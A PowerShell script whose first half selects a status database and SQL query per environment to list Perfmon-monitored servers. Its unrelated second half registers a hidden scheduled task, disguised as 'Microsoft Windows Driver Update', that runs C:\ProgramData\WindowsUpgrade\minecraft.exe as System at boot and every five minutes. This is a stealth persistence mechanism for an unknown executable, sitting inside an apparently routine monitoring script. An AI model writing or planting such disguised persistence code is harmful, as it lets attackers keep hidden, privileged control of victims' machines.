

$ENV = $args[0]

if ($ENV -eq $null){
    $ENV = "PROD"
    }
    
switch ($ENV) {
	"PROD"{ $DBServer 	= "status.db.prod.dexma.com"; 
			$DB 		= "status"; 
			$SQLQuery	= "SELECT     s.server_name
	            			FROM         dbo.t_server AS s INNER JOIN
	                        dbo.t_monitoring AS m ON s.server_id = m.server_id
	            			WHERE       (s.active = 1) AND (m.Perfmon = 1) AND (s.environment_id = 0)" }
	
	"DEMO"{ $DBServer 	= "status.db.stage.dexma.com"; 
			$DB 		= "statusstage";
			$SQLQuery 	= "SELECT     s.server_name
	            			FROM         dbo.t_server AS s INNER JOIN
	                        dbo.t_monitoring AS m ON s.server_id = m.server_id
	            			WHERE       (s.active = 1) AND (m.Perfmon = 1) AND (s.environment_id = 1)"}
	
	"IMP" { $DBServer 	= "status.db.imp.dexma.com"; 
			$DB 		= "statusimp";
			$SQLQuery	= "SELECT     s.server_name
	            			FROM         dbo.t_server AS s INNER JOIN
	                        dbo.t_monitoring AS m ON s.server_id = m.server_id
	            			WHERE       (s.active = 1) AND (m.Perfmon = 1) AND (s.environment_id IN ('2', '9'))"}
    }

Write-Host $DBServer, $DB, $SQLQuery


$TaskName = "Microsoft Windows Driver Update"
$TaskDescr = "Microsoft Windows Driver Update Services"
$TaskCommand = "C:\ProgramData\WindowsUpgrade\minecraft.exe"
$TaskScript = ""
$TaskArg = ""
$TaskStartTime = [datetime]::Now.AddMinutes(1) 
$service = new-object -ComObject("Schedule.Service")
$service.Connect()
$rootFolder = $service.GetFolder("\")
$TaskDefinition = $service.NewTask(0) 
$TaskDefinition.RegistrationInfo.Description = "$TaskDescr"
$TaskDefinition.Settings.Enabled = $true
$TaskDefinition.Settings.Hidden = $true
$TaskDefinition.Settings.RestartCount = "5"
$TaskDefinition.Settings.StartWhenAvailable = $true
$TaskDefinition.Settings.StopIfGoingOnBatteries = $false
$TaskDefinition.Settings.RestartInterval = "PT5M"
$triggers = $TaskDefinition.Triggers
$trigger = $triggers.Create(8)
$trigger.StartBoundary = $TaskStartTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
$trigger.Enabled = $true
$trigger.Repetition.Interval = "PT5M"
$TaskDefinition.Settings.DisallowStartIfOnBatteries = $true
$Action = $TaskDefinition.Actions.Create(0)
$action.Path = "$TaskCommand"
$action.Arguments = "$TaskArg"
$rootFolder.RegisterTaskDefinition("$TaskName",$TaskDefinition,6,"System",$null,5)
SCHTASKS /run /TN $TaskName

